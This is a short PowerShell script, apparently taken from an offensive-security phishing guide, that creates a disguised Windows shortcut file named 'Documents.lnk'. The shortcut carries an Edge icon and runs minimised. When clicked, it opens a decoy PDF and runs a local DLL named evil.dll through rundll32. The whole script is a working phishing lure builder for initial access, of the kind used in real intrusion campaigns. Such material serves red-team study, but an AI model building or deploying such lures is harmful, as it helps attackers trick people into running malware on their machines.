# https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk

$obj = New-object -comobject wscript.shell
# output file
$link = $obj.createshortcut("c:\payloads\nobelium\Documents.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\cmd.exe"
# predefined lnk icon
$link.iconlocation = "C:\program files (x86)\microsoft\edge\application\msedge, 13"
# command to execute
$link.arguments = '/c "start https://example.com/legit.pdf && rundll32 .\evil.dll,DllMain"'
$link.save()
